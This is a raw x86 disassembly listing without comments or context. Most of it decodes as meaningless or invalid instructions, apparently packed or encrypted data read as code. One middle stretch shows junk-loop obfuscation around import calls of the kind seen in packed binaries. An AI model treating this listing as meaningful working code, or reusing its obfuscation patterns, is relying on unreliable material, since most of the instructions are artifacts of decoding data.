  40a18d:	inc    esi
  40a18e:	cmc    
  40a18f:	add    BYTE PTR [ecx+0x6f],al
  40a192:	outs   dx,BYTE PTR ds:[esi]
  40a193:	xlat   BYTE PTR ds:[ebx]
  40a194:	cmp    dh,dl
  40a196:	and    ebx,DWORD PTR [esi-0x28bdd2a9]
  40a19c:	cmp    edx,DWORD PTR [edx]
  40a19e:	or     al,0xd8
  40a1a0:	and    bl,BYTE PTR [esi-0x5b]
  40a1a3:	mov    al,ds:0x7b05ad
  40a1a8:	jno    0x40a174
  40a1aa:	jne    0x40a1d2
  40a1ac:	call   0x2d49:0x169d0f2b
  40a1b3:	mov    ebx,0xe51e6971
  40a1b8:	sub    BYTE PTR [eax-0x3b],bh
  40a1bb:	loope  0x40a214
  40a1bd:	aam    0x35
  40a1bf:	dec    ebx
  40a1c0:	ret    
  40a1c1:	scas   eax,DWORD PTR es:[edi]
  40a1c2:	push   ss
  40a1c3:	mov    bl,0xf2
  40a1c5:	mov    ebp,0x1b2babd
  40a1ca:	add    bl,BYTE PTR [esi]
  40a1cc:	push   esp
  40a1cd:	jmp    0x40a23a
  40a1cf:	mov    cl,0x75
  40a1d1:	cli    
  40a1d2:	jecxz  0x40a1dc
  40a1d4:	push   ebx
  40a1d5:	push   esi
  40a1d6:	mov    bl,BYTE PTR [ebp+0x36]
  40a1d9:	rcr    BYTE PTR [ebx+0x69],cl
  40a1dc:	pop    edi
  40a1dd:	xor    al,0x99
  40a1df:	ins    BYTE PTR es:[edi],dx
  40a1e0:	jle    0x40a1d0
  40a1e2:	das    
  40a1e3:	mov    ah,0x99
  40a1e5:	sub    DWORD PTR [esp+ecx*4-0x38],eax
  40a1e9:	ins    DWORD PTR es:[edi],dx
  40a1ea:	pop    edx
  40a1eb:	and    cl,BYTE PTR [eiz*1+0x6e32eb43]
  40a1f2:	add    ecx,0x107ea6c6
  40a1f8:	popf   
  40a1f9:	fwait
  40a1fa:	xchg   BYTE PTR [eax-0x30162310],dl
  40a200:	push   esp
  40a201:	inc    ebp
  40a202:	push   esi
  40a203:	call   0x955bb4b0
  40a208:	gs inc edx
  40a20a:	push   ebp
  40a20b:	jns    0x40a1eb
  40a20d:	jmp    0x4710:0x4c268d9a
  40a214:	(bad)  
  40a215:	jmp    0x40a1c5
  40a217:	and    esi,DWORD PTR [eax]
  40a219:	push   ds
  40a21a:	jmp    0x5b5e5cf2
  40a21f:	dec    ebp
  40a220:	mov    ebp,0xc828adb6
  40a225:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a226:	int3   
  40a227:	sti    
  40a228:	dec    esp
  40a229:	sbb    DWORD PTR [esi-0x51],eax
  40a22c:	mov    esi,0x9c2ad8cd
  40a231:	or     DWORD PTR [esi+0x6b],edx
  40a234:	sbb    dh,bl
  40a236:	xchg   ecx,eax
  40a237:	std    
  40a238:	in     al,dx
  40a239:	es pop edx
  40a23b:	idiv   DWORD PTR [ebx-0x64a01ffa]
  40a241:	mov    esp,0x5b87f0e1
  40a246:	adc    DWORD PTR [edx-0x5d9dfdbd],0x3d3db002
  40a250:	outs   dx,DWORD PTR ds:[esi]
  40a251:	add    eax,0xc26463b4
  40a256:	push   ebx
  40a257:	or     al,0xea
  40a259:	mov    WORD PTR [edx],?
  40a25b:	mov    cl,0x33
  40a25d:	jb     0x40a23c
  40a25f:	out    0xef,al
  40a261:	push   esp
  40a262:	xchg   DWORD PTR [eax-0x6a982a1],ecx
  40a268:	in     eax,0x8
  40a26a:	sub    DWORD PTR [ebx],ecx
  40a26c:	popf   
  40a26d:	pop    ebp
  40a26e:	push   ds
  40a26f:	xor    edx,DWORD PTR [edi+edx*4-0x30]
  40a273:	or     BYTE PTR [esi+0x5f561787],ch
  40a279:	(bad)
  40a27d:	pop    esp
  40a27e:	jo     0x40a2ab
  40a280:	and    eax,0x57ce1cf6
  40a285:	(bad)  
  40a286:	push   ebp
  40a287:	xchg   edx,eax
  40a288:	mov    edx,0xd99eacf6
  40a28d:	or     al,0xc0
  40a28f:	hlt    
  40a290:	lods   al,BYTE PTR ds:[esi]
  40a291:	xchg   DWORD PTR [eax],ebx
  40a293:	push   esp
  40a294:	push   edx
  40a295:	(bad)  
  40a296:	pop    ebx
  40a297:	fstp   DWORD PTR [edx+0x55]
  40a29a:	js     0x40a28d
  40a29c:	cmp    al,bh
  40a29e:	jb     0x40a259
  40a2a0:	pop    ss
  40a2a1:	adc    eax,0x2265e31f
  40a2a6:	push   eax
  40a2a7:	add    ch,BYTE PTR [esi+ebx*1]
  40a2aa:	sar    BYTE PTR [ebp+0x6b676c11],1
  40a2b0:	sub    ebx,DWORD PTR [esi-0x378690e3]
  40a2b6:	mov    ecx,0x75542ef1
  40a2bb:	popa   
  40a2bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2bd:	pusha  
  40a2be:	out    0xae,eax
  40a2c0:	jmp    0x40a28d
  40a2c2:	dec    ecx
  40a2c3:	sbb    dl,BYTE PTR [eax+0x7c238efc]
  40a2c9:	aad    0x2f
  40a2cb:	or     eax,0xa09f287e
  40a2d0:	loope  0x40a2e6
  40a2d2:	sahf   
  40a2d3:	inc    ebp
  40a2d4:	add    ah,BYTE PTR [ecx+0x32]
  40a2d7:	mov    ch,0xe9
  40a2d9:	xor    al,0x73
  40a2db:	ror    DWORD PTR [esi-0x8c791b1],1
  40a2e1:	or     eax,0x57572a71
  40a2e6:	push   edi
  40a2e7:	xchg   esi,eax
  40a2e8:	sbb    bh,BYTE PTR [eax+eax*4]
  40a2eb:	lea    edx,[edi-0x45]
  40a2ee:	daa    
  40a2ef:	mov    edx,0x475a0f4c
  40a2f4:	sub    ebp,ecx
  40a2f6:	mov    dh,0x23
  40a2f8:	push   esp
  40a2f9:	push   ss
  40a2fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2fb:	outs   dx,BYTE PTR ds:[esi]
  40a2fc:	dec    esi
  40a2fd:	inc    ebx
  40a2fe:	popa   
  40a2ff:	shr    BYTE PTR [eax+eax*8],1
  40a302:	repnz xchg ecx,eax
  40a304:	mov    dh,0x81
  40a306:	sub    BYTE PTR [edx+ebp*8+0x6e],0xca
  40a30b:	(bad)  
  40a30c:	(bad)  [ecx+ecx*4-0x6c09c442]
  40a313:	mov    ss,esi
  40a315:	std    
  40a316:	mov    esi,0x65eb9612
  40a31b:	aaa    
  40a31c:	shl    bl,cl
  40a31e:	sub    eax,0xa42e6c24
  40a323:	jge    0x40a368
  40a325:	(bad)  
  40a326:	pop    ebx
  40a327:	xchg   esp,eax
  40a328:	sub    eax,0xa769da9e
  40a32d:	stos   DWORD PTR es:[edi],eax
  40a32e:	leave  
  40a32f:	cld    
  40a330:	loop   0x40a33e
  40a332:	push   esp
  40a333:	retf   0x1feb
  40a336:	cld    
  40a337:	and    DWORD PTR [edx-0x627f008],edi
  40a33d:	mov    ch,0x6d
  40a33f:	mov    al,ds:0x4a2c26db
  40a344:	jb     0x40a34e
  40a346:	into   
  40a347:	sub    DWORD PTR [eax+0x49],ebp
  40a34a:	xlat   BYTE PTR ds:[ebx]
  40a34b:	test   al,0x45
  40a34d:	or     ecx,DWORD PTR [edx-0x25ac261b]
  40a353:	ja     0x40a2ed
  40a355:	sbb    al,0xec
  40a357:	push   ecx
  40a358:	inc    ebp
  40a359:	and    ah,ch
  40a35b:	cmpxchg BYTE PTR [edx],cl
  40a35e:	push   0x26
  40a360:	outs   dx,BYTE PTR ds:[esi]
  40a361:	sub    BYTE PTR [edx],0xd3
  40a364:	cdq    
  40a365:	jb     0x40a331
  40a367:	jae    0x40a37b
  40a369:	ins    DWORD PTR es:[edi],dx
  40a36a:	int    0x53
  40a36c:	sub    al,0xe0
  40a36e:	jb     0x40a312
  40a370:	cdq    
  40a371:	mov    edx,0xdd1ff3a0
  40a376:	push   esp
  40a377:	cmp    eax,0x5237100
  40a37c:	(bad)  
  40a37d:	jmp    0x40a320
  40a37f:	jle    0x40a307
  40a381:	addr16 sub eax,0xcce44bb1
  40a387:	aad    0xf0
  40a389:	lods   al,BYTE PTR ds:[esi]
  40a38a:	inc    ebp
  40a38b:	jge    0x40a3a2
  40a38d:	jmp    0x24ed98f0
  40a392:	(bad)  
  40a393:	gs std 
  40a395:	test   eax,0x8b7eb231
  40a39a:	pop    edi
  40a39b:	jg     0x40a3e1
  40a39d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a39e:	shl    DWORD PTR [edi+0xaee96eb],1
  40a3a4:	mov    fs,WORD PTR [edx-0x4d]
  40a3a7:	pop    ebp
  40a3a8:	int    0x9e
  40a3aa:	(bad)  
  40a3ac:	mov    dl,0x83
  40a3ae:	cmp    al,0x8f
  40a3b0:	clc    
  40a3b1:	mov    dh,0x7d
  40a3b3:	jl     0x40a33f
  40a3b5:	retf   
  40a3b6:	call   0xca500d0e
  40a3bb:	sldt   WORD PTR [ebx-0x4c]
  40a3bf:	outs   dx,BYTE PTR ds:[esi]
  40a3c0:	dec    eax
  40a3c1:	mov    dh,0x51
  40a3c3:	and    dl,bh
  40a3c5:	mov    esi,0x30b17b5
  40a3ca:	ret    
  40a3cb:	mov    dl,0xd1
  40a3cd:	push   edi
  40a3ce:	js     0x40a363
  40a3d0:	cmp    eax,edi
  40a3d2:	push   0x46f52cc3
  40a3d7:	adc    BYTE PTR [edi-0x5e794ca5],bl
  40a3dd:	xor    al,0x7c
  40a3df:	mov    ebx,fs
  40a3e1:	pop    esi
  40a3e2:	leave  
  40a3e3:	test   eax,0xf4692d3
  40a3e8:	fld    DWORD PTR [esi-0x12]
  40a3eb:	mov    dh,0x51
  40a3ed:	push   ebp
  40a3ee:	mov    ecx,0x14dd3e70
  40a3f3:	fisubr DWORD PTR [edx+edi*8-0xf]
  40a3f7:	test   eax,0xd445c7af
  40a3fc:	cmp    eax,DWORD PTR [ebp+0x45c7f89c]
  40a402:	sar    BYTE PTR [edx],1
  40a404:	test   DWORD PTR [eax+edi*8+0x45c7ff0b],ebx
  40a40b:	int3   
  40a40c:	cmp    eax,0x1bf89c85
  40a411:	cmp    eax,0x434687
  40a416:	mov    DWORD PTR [ebp-0x38],0xf89c853c
  40a41d:	mov    DWORD PTR ds:0x4345f3,0x13
  40a427:	cmp    DWORD PTR ds:0x4345f3,0x0
  40a42e:	je     0x40a4bc
  40a434:	cmp    DWORD PTR ds:0x4345f3,0x21
  40a43b:	jne    0x40a44c
  40a441:	push   0x43470f
  40a446:	call   DWORD PTR ds:0x413338
  40a44c:	xor    edi,edi
  40a44e:	xor    edi,DWORD PTR ds:0x4345f3
  40a454:	dec    edi
  40a455:	mov    DWORD PTR ds:0x4345f3,edi
  40a45b:	jmp    0x40a427
  40a460:	and    DWORD PTR ds:0x4346fb,0x0
  40a46a:	mov    edx,DWORD PTR ds:0x4346fb
  40a470:	inc    edx
  40a471:	mov    DWORD PTR ds:0x4346fb,edx
  40a477:	cmp    DWORD PTR ds:0x4346fb,0x21
  40a47e:	jne    0x40a4a9
  40a484:	push   0x18fd
  40a489:	push   0x7257
  40a48e:	push   DWORD PTR [ebp-0xc]
  40a491:	push   0x4346b7
  40a496:	push   0x5f6e
  40a49b:	push   DWORD PTR [ebp-0xc]
  40a49e:	push   0x4349a7
  40a4a3:	call   DWORD PTR ds:0x41333c
  40a4a9:	cmp    DWORD PTR ds:0x4346fb,0x15
  40a4b0:	jb     0x40a46a
  40a4b6:	or     DWORD PTR ds:0x43464b,ebx
  40a4bc:	mov    DWORD PTR [ebp-0x3c],0xf89c853f
  40a4c3:	sbb    edi,0x2ba6
  40a4c9:	mov    edx,DWORD PTR [ebp+0x8]
  40a4cc:	xor    edx,eax
  40a4ce:	sub    DWORD PTR ds:0x434693,ecx
  40a4d4:	mov    edi,DWORD PTR [ebp-0x10]
  40a4d7:	or     DWORD PTR ds:0x434653,0x43464f
  40a4e1:	add    edx,ecx
  40a4e3:	cmp    edi,edx
  40a4e5:	je     0x40e6c9
  40a4eb:	mov    DWORD PTR ds:0x434677,0x7850
  40a4f5:	push   ebx
  40a4f6:	jmp    0x40de76
  40a4fb:	xor    DWORD PTR ds:0x434677,0x535d
  40a505:	mov    edx,DWORD PTR [ebp-0x8]
  40a508:	add    DWORD PTR ds:0x434703,edx
  40a50e:	mov    edi,DWORD PTR [ebp-0x10]
  40a511:	add    DWORD PTR ds:0x4346cb,0x43467b
  40a51b:	sub    edi,edx
  40a51d:	mov    DWORD PTR ds:0x43464f,0x500e
  40a527:	mov    edx,DWORD PTR [ebp-0x4]
  40a52a:	and    DWORD PTR ds:0x43464f,0x1370
  40a534:	xor    edx,eax
  40a536:	add    DWORD PTR ds:0x4345f3,0x35ec
  40a540:	add    edx,ecx
  40a542:	mov    DWORD PTR ds:0x4345fb,0xac0
  40a54c:	cmp    edi,edx
  40a54e:	mov    DWORD PTR ds:0x4346fb,0x5818
  40a558:	jb     0x40e2b1
  40a55e:	mov    ebx,DWORD PTR ds:0x434717
  40a564:	mov    edx,DWORD PTR ds:0x434727
  40a56a:	sub    ebx,edx
  40a56c:	xor    ebx,DWORD PTR [ebx+edx*1]
  40a56f:	mov    edx,DWORD PTR [ebp-0x28]
  40a572:	mov    edi,DWORD PTR [ebp-0x4]
  40a575:	and    DWORD PTR ds:0x43463f,0x0
  40a57f:	mov    ebx,DWORD PTR ds:0x43463f
  40a585:	inc    ebx
  40a586:	mov    DWORD PTR ds:0x43463f,ebx
  40a58c:	cmp    DWORD PTR ds:0x43463f,0x9
  40a593:	jne    0x40a5a2
  40a599:	push   DWORD PTR [ebp-0x20]
  40a59c:	call   DWORD PTR ds:0x413340
  40a5a2:	cmp    DWORD PTR ds:0x43463f,0x8
  40a5a9:	jne    0x40a5bc
  40a5af:	mov    ebx,DWORD PTR ds:0x43463f
  40a5b5:	inc    ebx
  40a5b6:	mov    DWORD PTR ds:0x43463f,ebx
  40a5bc:	cmp    DWORD PTR ds:0x43463f,0x1c
  40a5c3:	jb     0x40a57f
  40a5c9:	xor    edx,eax
  40a5cb:	inc    ebx
  40a5cc:	xor    edi,eax
  40a5ce:	sbb    ebx,DWORD PTR ds:0x43467f
  40a5d4:	add    edi,ecx
  40a5d6:	or     DWORD PTR ds:0x434637,ecx
  40a5dc:	add    edx,ecx
  40a5de:	imul   edx,edi
  40a5e1:	mov    edi,DWORD PTR [ebp-0x8]
  40a5e4:	mov    DWORD PTR ds:0x43464b,0x1b
  40a5ee:	cmp    DWORD PTR ds:0x43464b,0x0
  40a5f5:	je     0x40a629
  40a5fb:	cmp    DWORD PTR ds:0x43464b,0x1d
  40a602:	jne    0x40a611
  40a608:	push   DWORD PTR [ebp-0x10]
  40a60b:	call   DWORD PTR ds:0x413404
  40a611:	mov    ebx,DWORD PTR ds:0x43464b
  40a617:	dec    ebx
  40a618:	mov    DWORD PTR ds:0x43464b,ebx
  40a61e:	jmp    0x40a5ee
  40a623:	and    DWORD PTR ds:0x4346c7,ecx
  40a629:	mov    ebx,DWORD PTR [ebp-0x10]
  40a62c:	sub    ebx,edi
  40a62e:	cmp    ebx,edx
  40a630:	mov    DWORD PTR ds:0x43463f,0x5ce6
  40a63a:	ja     0x40aa85
  40a640:	xor    edx,edx
  40a642:	add    edx,DWORD PTR ds:0x4346bf
  40a648:	add    DWORD PTR ds:0x434713,edx
  40a64e:	mov    edx,DWORD PTR [ebp-0x4]
  40a651:	or     DWORD PTR ds:0x43467f,0x434707
  40a65b:	jmp    0x40aa72
  40a660:	xchg   edx,eax
  40a661:	dec    ebx
  40a662:	in     al,0xe
  40a664:	in     eax,dx
  40a665:	test   eax,0x2c38537c
  40a66a:	out    0x8f,eax
  40a66c:	push   ecx
  40a66d:	scas   eax,DWORD PTR es:[edi]
  40a66e:	push   ss
  40a66f:	icebp  
  40a670:	cli    
  40a671:	bnd jle 0x40a6f2
  40a674:	jo     0x40a6ef
  40a676:	jle    0x40a6f6
  40a678:	add    eax,DWORD PTR [ebp+0x32665761]
  40a67e:	jle    0x40a6ac
  40a680:	call   0x9530ac96
  40a685:	nop
  40a686:	sub    BYTE PTR [eax-0x38],bl
  40a689:	icebp  
  40a68a:	ins    DWORD PTR es:[edi],dx
  40a68b:	xchg   edi,eax
  40a68c:	jns    0x40a67e
  40a68e:	rcl    DWORD PTR [eax],cl
  40a690:	push   esi
  40a691:	add    ecx,ebp
  40a693:	mov    eax,0xc2ee1bcf
  40a698:	pop    ds
  40a699:	and    DWORD PTR [esi+eiz*1+0x2],esi
  40a69d:	adc    BYTE PTR [ebx],0xdb
  40a6a0:	mov    ds:0xe8aa80a0,al
  40a6a5:	retf   0xebd9
  40a6a8:	push   ss
  40a6a9:	and    BYTE PTR [esi],ch
  40a6ab:	pushf  
  40a6ac:	sub    eax,0x1a5605f1
  40a6b1:	add    DWORD PTR [edi+ecx*1+0x23],0x4e
  40a6b6:	cmp    BYTE PTR [eax+ebx*4-0x17e6aabb],ch
  40a6bd:	out    dx,eax
  40a6be:	cmp    eax,edx
  40a6c0:	dec    esi
  40a6c1:	ss aaa 
  40a6c3:	addr16 push eax
  40a6c5:	adc    bh,al
  40a6c7:	mov    ds:0x82576dbd,al
  40a6cc:	mov    BYTE PTR [edx-0x7a],0x1b
  40a6d0:	nop
  40a6d1:	shr    DWORD PTR [edi+eiz*8+0x5b98b13d],cl
  40a6d8:	dec    edi
  40a6d9:	jecxz  0x40a700
  40a6db:	adc    DWORD PTR [ebp+0x47],ebx
  40a6de:	out    0xb6,al
  40a6e0:	(bad)  
  40a6e1:	cmp    cl,BYTE PTR [eax]
  40a6e3:	cwde   
  40a6e4:	jb     0x40a6f4
  40a6e6:	sub    eax,0xaa9470e4
  40a6eb:	imul   ebx,ebp,0x9fd6b38f
  40a6f1:	pop    es
  40a6f2:	arpl   WORD PTR [ebp+0x3a],si
  40a6f5:	(bad)  
  40a6f6:	pop    esp
  40a6f7:	xor    eax,0xe24b2028
  40a6fc:	mov    eax,ds:0xf04e1d8f
  40a701:	dec    esp
  40a702:	sbb    DWORD PTR [edi+0x6ab7d4ae],esp
  40a708:	cmp    DWORD PTR [edx-0x59391306],ecx
  40a70e:	mov    ecx,0x2b46d785
  40a713:	push   ecx
  40a714:	ret    0xce65
  40a717:	leave  
  40a718:	addr16 or eax,0x6a97342c
  40a71e:	jo     0x40a714
  40a720:	mov    esp,0x71a8791c
  40a725:	ret    0x77b2
  40a728:	adc    al,0x78
  40a72a:	pop    es
  40a72b:	nop
  40a72c:	loop   0x40a6f3
  40a72e:	inc    ebp
  40a72f:	xor    bl,bh
  40a731:	add    cl,cl
  40a733:	out    0x43,al
  40a735:	jmp    0xcba4:0x7600672e
  40a73c:	sbb    eax,0xe97fd4ae
  40a741:	mov    bl,0xf8
  40a743:	inc    DWORD PTR [ebx]
  40a745:	shl    BYTE PTR [ecx+0x63d939cd],cl
  40a74b:	mov    al,0x36
  40a74d:	jp     0x40a75f
  40a74f:	cmp    ebx,DWORD PTR [edx]
  40a751:	lahf   
  40a752:	jmp    0x9b32:0x38c1a8d9
  40a759:	push   ecx
  40a75a:	cmp    ecx,DWORD PTR [ebx-0x71]
  40a75d:	sar    al,0x31
  40a760:	add    al,0x5b
  40a762:	mov    bl,BYTE PTR [ebx-0x4e]
  40a765:	dec    edx
  40a766:	inc    ebp
  40a767:	cwde   
  40a768:	adc    ch,cl
  40a76a:	into   
  40a76b:	test   al,0xd
  40a76d:	sub    BYTE PTR [ebp-0x22],0x6b
  40a771:	neg    BYTE PTR [eax+0x72627d82]
  40a777:	xchg   BYTE PTR [edx+0x8],dh
  40a77a:	out    dx,eax
  40a77b:	pop    ds
  40a77c:	ss mov al,0xad
  40a77f:	and    dl,BYTE PTR [ebp+0x5fd5e210]
  40a785:	(bad)  
  40a786:	cmp    esi,DWORD PTR ds:0x8e66621e
  40a78c:	xchg   esp,eax
  40a78d:	dec    esi
  40a78e:	sub    al,0x23
  40a790:	imul   esp,eax,0xf9772fec
  40a796:	lock mov ch,BYTE PTR [edi]
  40a799:	(bad)  
  40a79a:	xor    esp,ebx
  40a79c:	mov    ah,0x21
  40a79e:	gs out 0x18,eax
  40a7a1:	cwde   
  40a7a2:	inc    esi
  40a7a3:	fwait
  40a7a4:	mov    edi,0xdee83e35
  40a7a9:	jb     0x40a7bd
  40a7ab:	xchg   ebx,eax
  40a7ac:	test   DWORD PTR cs:[ecx+0x5dd33ceb],0x6ed6ebbd
  40a7b7:	fisub  DWORD PTR [ecx-0x36f23cd5]
  40a7bd:	sbb    BYTE PTR [ecx],al
  40a7bf:	int    0xf4
  40a7c1:	jmp    0xbd2b:0xcf4fa520
  40a7c8:	add    al,0x38
  40a7ca:	mov    edx,0x8e8d29d4
  40a7cf:	mov    esi,0x74ee8653
  40a7d4:	aas    
  40a7d5:	jle    0x40a7d0
  40a7d7:	mov    ch,0xaa
  40a7d9:	sub    esi,ebx
  40a7db:	test   eax,0x3f73a111
  40a7e0:	xchg   ebx,eax
  40a7e1:	retf   
  40a7e2:	push   0xb077aa3f
  40a7e7:	fst    QWORD PTR [edx+0x634a8ab8]
  40a7ed:	mov    edi,0x1ef7a7ee
  40a7f2:	enter  0x8fc,0x72
  40a7f6:	aad    0x72
  40a7f8:	mov    esp,0x5600c86d
  40a7fd:	mov    al,ds:0x243f8ef8
  40a802:	mov    ah,dl
  40a804:	pop    ebx
  40a805:	cli    
  40a806:	or     cl,BYTE PTR [ebp*1-0x5a4aff89]
  40a80d:	dec    eax
  40a80e:	outs   dx,BYTE PTR ds:[esi]
  40a80f:	pop    ecx
  40a810:	(bad)  
  40a811:	push   esp
  40a812:	arpl   WORD PTR [esi-0x6bb9f1db],bp
  40a818:	test   DWORD PTR [eax+0x60],eax
  40a81b:	out    0xcc,eax
  40a81d:	push   ebx
  40a81e:	imul   ebp,DWORD PTR [edx-0x37],0x6aef1a11
  40a825:	cld    
  40a826:	inc    esi
  40a827:	outs   dx,DWORD PTR ds:[esi]
  40a828:	enter  0xefc5,0x14
  40a82c:	or     dl,BYTE PTR [ecx+0x13d9a11d]
  40a832:	outs   dx,DWORD PTR ds:[esi]
  40a833:	call   0xd436:0x10c2462c
  40a83a:	add    edi,edx
  40a83c:	aam    0xe6
  40a83e:	into   
  40a83f:	cdq    
  40a840:	(bad)  
  40a841:	xlat   BYTE PTR ds:[ebx]
  40a842:	cmp    al,0xb9
  40a844:	pop    edx
  40a845:	mov    cl,ah
  40a847:	mov    bl,0x37
  40a849:	ret    0x8fda
  40a84c:	push   ebx
  40a84d:	test   DWORD PTR es:[esi+0x15],eax
  40a851:	lea    esi,[esi+ebp*2+0x4]
  40a855:	cmp    eax,0xc8face66
  40a85a:	sbb    esi,edi
  40a85c:	retf   
  40a85d:	out    dx,eax
  40a85e:	mov    dl,0x37
  40a860:	enter  0x1a95,0xb8
  40a864:	(bad)  
  40a865:	jl     0x40a7e7
  40a867:	dec    edx
  40a868:	mov    ecx,0x1f845964
  40a86d:	dec    esi
  40a86e:	test   eax,0x2049aabc
  40a873:	pop    edx
  40a874:	dec    ebx
  40a875:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a876:	sar    BYTE PTR [eax],0xfa
  40a879:	push   esp
  40a87a:	outs   dx,DWORD PTR ds:[esi]
  40a87b:	mov    dl,BYTE PTR [ecx]
  40a87d:	enter  0x20d2,0xc2
  40a881:	int3   
  40a882:	xlat   BYTE PTR ds:[ebx]
  40a883:	outs   dx,BYTE PTR ds:[esi]
  40a884:	and    bl,BYTE PTR [esi+0x99864af]
  40a88a:	xchg   edx,eax
  40a88b:	mov    ah,al
  40a88d:	inc    ecx
  40a88e:	into   
  40a88f:	add    ebp,ebp
  40a891:	mov    bh,0x6b
  40a893:	ja     0x40a897
  40a895:	jp     0x40a8fd
  40a897:	mov    edx,0x68528be1
  40a89c:	ds mov ah,0xb4
  40a89f:	icebp  
  40a8a0:	fs push esp
  40a8a2:	call   0x15dfd9af
  40a8a7:	mov    ah,0x7e
  40a8a9:	scas   eax,DWORD PTR es:[edi]
  40a8aa:	xchg   edi,eax
  40a8ab:	add    DWORD PTR ds:0xb9eeebd6,0xf4252f7c
  40a8b5:	or     DWORD PTR [esi-0x3b],esi
  40a8b8:	sub    dh,BYTE PTR [ebx]
  40a8ba:	mov    cl,0x3a
  40a8bc:	push   ebx
  40a8bd:	(bad)  
  40a8be:	retf   
  40a8bf:	xor    al,0xf4
  40a8c1:	push   ebp
  40a8c2:	xchg   edx,eax
  40a8c3:	pop    ebp
  40a8c4:	dec    esp
  40a8c5:	retf   
  40a8c6:	inc    edi
  40a8c7:	aas    
  40a8c8:	inc    ecx
  40a8c9:	xchg   esp,eax
  40a8ca:	ds (bad) 
  40a8cc:	fadd   st(7),st
  40a8ce:	and    BYTE PTR [edi],dl
  40a8d0:	sub    BYTE PTR [ecx],0xcd
  40a8d3:	jp     0x40a934
  40a8d5:	loopne 0x40a90f
  40a8d7:	mov    al,ds:0x170bffc6
  40a8dc:	inc    esi
  40a8dd:	xor    eax,0xe216aef0
  40a8e2:	mov    cs,WORD PTR [esi]
  40a8e4:	pop    es
  40a8e5:	fadd   DWORD PTR [ebx]
  40a8e7:	lds    ebx,FWORD PTR [ecx-0x3]
  40a8ea:	add    eax,0x3551da9
  40a8ef:	mov    ebx,0x89647a5a
  40a8f4:	repz dec eax
  40a8f6:	xor    dh,BYTE PTR [eax+0x6f28374b]
  40a8fc:	mov    dh,0xc1
  40a8fe:	push   esi
  40a8ff:	jno    0x40a94b
  40a901:	arpl   si,bx
  40a903:	call   0xea2f:0x8684ffd4
  40a90a:	enter  0x3923,0x62
  40a90e:	and    dh,BYTE PTR [esi]
  40a910:	not    BYTE PTR [eax]
  40a912:	push   edi
  40a913:	jmp    0xbfc0:0x3dc5e6fb
  40a91a:	xchg   ecx,eax
  40a91b:	repz rcr BYTE PTR [esi-0x6710641a],0x25
  40a923:	jmp    0x6be3:0xd51d82d3
  40a92a:	mov    ebx,0x4e41d77b
  40a92f:	add    ebx,ecx
  40a931:	mov    bl,0xb9
  40a933:	xor    ebp,ebx
  40a935:	repz or DWORD PTR [edi-0x595ea97d],esi
  40a93c:	popf   
  40a93d:	mov    DWORD PTR [ebx-0x64ec1244],ecx
  40a943:	fidivr DWORD PTR [eax]
  40a945:	sti    
  40a946:	dec    ebx
  40a947:	mov    edi,0xbc88ee81
  40a94c:	jno    0x40a8e8
  40a94e:	mov    bl,0xbc
  40a950:	inc    edi
  40a951:	into   
  40a952:	cmp    al,0x4f
  40a954:	mov    bh,0x75
  40a956:	adc    BYTE PTR [ecx-0x17],0x83
  40a95a:	cmc    
  40a95b:	or     al,0x91
  40a95d:	xchg   esp,eax
  40a95e:	mov    edx,0x3515f1f8
  40a963:	stos   DWORD PTR es:[edi],eax
  40a964:	pop    ss
  40a965:	loopne 0x40a99b
  40a967:	adc    DWORD PTR [ecx+edi*4-0x61],0xffffffc6
  40a96c:	mov    cl,0xd4
  40a96e:	push   0x3db250f6
  40a973:	call   0x6d73f1d
  40a978:	ror    DWORD PTR [edi+0x28d080cb],1
  40a97e:	mov    WORD PTR [esi+esi*1-0x55484d8f],fs
  40a985:	cmp    ebp,DWORD PTR [ecx+0x3]
  40a988:	push   ebp
  40a989:	sbb    ecx,ebp
  40a98b:	ss and al,0xec
  40a98e:	cmp    edx,ecx
  40a990:	push   ebp
  40a991:	xchg   DWORD PTR [esi+0x33],eax
  40a994:	test   al,0x76
  40a996:	add    al,0x94
  40a998:	popf   
  40a999:	imul   ebx,DWORD PTR [ecx],0xffffffe8
  40a99c:	pop    edi
  40a99d:	sub    cl,BYTE PTR [ecx]
  40a99f:	mov    dl,0x7b
  40a9a1:	pushf  
  40a9a2:	imul   ebp,DWORD PTR [eax],0xffffffe6
  40a9a5:	adc    ecx,DWORD PTR gs:[ecx-0x2f]
  40a9a9:	pushf  
  40a9aa:	je     0x40a970
  40a9ac:	xor    DWORD PTR [ecx-0x792af859],edx
  40a9b2:	cmp    al,bh
  40a9b4:	lea    edi,[ebx-0x53a5efa8]
  40a9ba:	aas    
  40a9bb:	cmp    DWORD PTR [eax-0x47],0x36
  40a9bf:	(bad)  
  40a9c1:	or     ch,al
  40a9c3:	rcr    DWORD PTR [ebx],1
  40a9c5:	sbb    dl,BYTE PTR [esi]
  40a9c7:	(bad)  
  40a9c8:	jmp    0x5324:0x3e02011a
  40a9cf:	int    0x36
  40a9d1:	test   al,0x77
  40a9d3:	mov    BYTE PTR [edx-0x30b0649b],dl
  40a9d9:	or     edx,DWORD PTR [ebp+ebx*8+0x554badfe]
  40a9e0:	pop    edx
  40a9e1:	mov    ah,0xfb
  40a9e3:	ror    BYTE PTR [ebx-0x60],1
  40a9e6:	push   esp
  40a9e7:	mov    bh,0xb4
  40a9e9:	jno    0x40aa3b
  40a9eb:	stos   BYTE PTR es:[edi],al
  40a9ec:	jl     0x40a987
  40a9ee:	jle    0x40a9ff
  40a9f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9f1:	je     0x40aa62
  40a9f3:	add    bl,dl
  40a9f5:	add    eax,0x33155c47
  40a9fa:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40a9fc:	cwde   
  40a9fd:	adc    ebx,DWORD PTR [edx]
  40a9ff:	mov    dh,0x4d
  40aa01:	mov    ebp,0x53221637
  40aa06:	xor    DWORD PTR [ecx],ebp
  40aa08:	jo     0x40aa74
  40aa0a:	shl    DWORD PTR [ebp-0x32],cl
  40aa0d:	(bad)  
  40aa0e:	and    al,0xab
  40aa10:	stos   BYTE PTR es:[edi],al
  40aa11:	mov    WORD PTR [esi+0x12b5dade],?
  40aa17:	loope  0x40aa18
  40aa19:	(bad)  
  40aa1a:	stc    
  40aa1b:	pop    edi
  40aa1c:	dec    esp
